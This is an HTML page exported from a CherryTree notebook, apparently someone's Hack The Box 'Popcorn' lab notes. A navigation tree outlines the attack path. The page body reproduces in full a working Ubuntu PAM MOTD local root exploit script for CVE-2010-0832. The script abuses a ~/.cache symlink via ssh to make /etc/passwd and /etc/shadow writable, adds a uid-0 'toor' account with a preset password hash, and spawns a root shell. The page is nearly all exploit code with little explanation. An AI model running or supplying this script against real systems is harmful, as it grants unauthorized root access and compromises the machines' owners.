<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>14339.sh raw code</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="HacktheBox--Linux_Boxes--popcorn.html">popcorn</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster.html">dirbuster</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---test.html">/test</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent.html">/torrent</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--register.html">register</a></li>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold.html">foothold </a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_save_directory.html">upload save directory</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png.html">upload noss.png </a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--kali_torrent_dl_and_upload_(fail).html">kali torrent dl and upload (fail)</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--test.torrent_(fail).html">test.torrent (fail)</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success).html">torrent file (success)</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--edit_this_torrent-change_screenshot.html">edit this torrent/change screenshot</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection.html">Repeater simple php code injection</a></li>
<ol>
<li><a href="theBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection--wget_tcp_pty_handler.html">wget tcp_pty_handler</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--foothold--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection--reverse_shell.html">reverse shell</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc.html">Privesc</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--lse.sh.html">lse.sh</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc.html">MotD Privesc</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc--14339.sh.html">14339.sh</a></li>
<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc--14339.sh_raw_code.html">14339.sh raw code</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--root.html">root</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>14339.sh raw code</u></b></h1><img src="images/2011-1.png" alt="images/2011-1.png" /><br /><br />#!/bin/bash<br />#<br /># Exploit Title: Ubuntu PAM MOTD local root<br /># Date: July 9, 2010<br /># Author: Anonymous<br /># Software Link: <a href="http://packages.ubuntu.com/">http://packages.ubuntu.com/</a><br /># Version: pam-1.1.0<br /># Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)<br /># CVE: CVE-2010-0832<br /># Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i<br /># References: <a href="http://www.exploit-db.com/exploits/14273/">http://www.exploit-db.com/exploits/14273/</a> by Kristian Erik Hermansen<br />#<br /># Local root by adding temporary user toor:toor with id 0 to /etc/passwd &amp; /etc/shadow.<br /># Does not prompt for login by creating temporary SSH key and authorized_keys entry.<br />#<br />#   user@ubuntu:~$ bash ubuntu-pam-motd-localroot.sh<br />#   [*] Ubuntu PAM MOTD local root<br />#   [*] Backuped /home/user/.ssh/authorized_keys<br />#   [*] SSH key set up<br />#   [*] Backuped /home/user/.cache<br />#   [*] spawn ssh<br />#   [+] owned: /etc/passwd<br />#   [*] spawn ssh<br />#   [+] owned: /etc/shadow<br />#   [*] Restored /home/user/.cache<br />#   [*] Restored /home/user/.ssh/authorized_keys<br />#   [*] SSH key removed<br />#   [+] Success! Use password toor to get root<br />#   Password:<br />#   root@ubuntu:/home/user# id<br />#   uid=0(root) gid=0(root) groupes=0(root)<br />#<br />P='toor:x:0:0:root:/root:/bin/bash'<br />S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'<br />echo "[*] Ubuntu PAM MOTD local root"<br />[ -z "$(which ssh)" ] &amp;&amp; echo "[-] ssh is a requirement" &amp;&amp; exit 1<br />[ -z "$(which ssh-keygen)" ] &amp;&amp; echo "[-] ssh-keygen is a requirement" &amp;&amp; exit 1<br />[ -z "$(ps -u root |grep sshd)" ] &amp;&amp; echo "[-] a running sshd is a requirement" &amp;&amp; exit 1<br />backup() {<br />    [ -e "$1" ] &amp;&amp; [ -e "$1".bak ] &amp;&amp; rm -rf "$1".bak<br />    [ -e "$1" ] || return 0<br />    mv "$1"{,.bak} || return 1<br />    echo "[*] Backuped $1"<br />}<br />restore() {<br />    [ -e "$1" ] &amp;&amp; rm -rf "$1"<br />    [ -e "$1".bak ] || return 0<br />    mv "$1"{.bak,} || return 1<br />    echo "[*] Restored $1"<br />}<br />key_create() {<br />    backup ~/.ssh/authorized_keys<br />    ssh-keygen -q -t rsa -N '' -C 'pam' -f "$KEY" || return 1<br />    [ ! -d ~/.ssh ] &amp;&amp; { mkdir ~/.ssh || return 1; }<br />    mv "$KEY.pub" ~/.ssh/authorized_keys || return 1<br />    echo "[*] SSH key set up"<br />}<br />key_remove() {<br />    rm -f "$KEY"<br />    restore ~/.ssh/authorized_keys<br />    echo "[*] SSH key removed"<br />}<br />own() {<br />    [ -e ~/.cache ] &amp;&amp; rm -rf ~/.cache<br />    ln -s "$1" ~/.cache || return 1<br />    echo "[*] spawn ssh"<br />    ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true<br />    [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }<br />    echo "[+] owned: $1"<br />}<br />bye() {<br />    key_remove<br />    exit 1<br />}<br />KEY="$(mktemp -u)"<br />key_create || { echo "[-] Failed to setup SSH key"; exit 1; }<br />backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }<br />own /etc/passwd &amp;&amp; echo "$P" &gt;&gt; /etc/passwd<br />own /etc/shadow &amp;&amp; echo "$S" &gt;&gt; /etc/shadow<br />restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }<br />key_remove<br />echo "[+] Success! Use password toor to get root"<br />su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \<br />  chgrp shadow /etc/shadow; nscd -i passwd &gt;/dev/null 2&gt;&amp;1; bash" toor</div></div>
</body></html>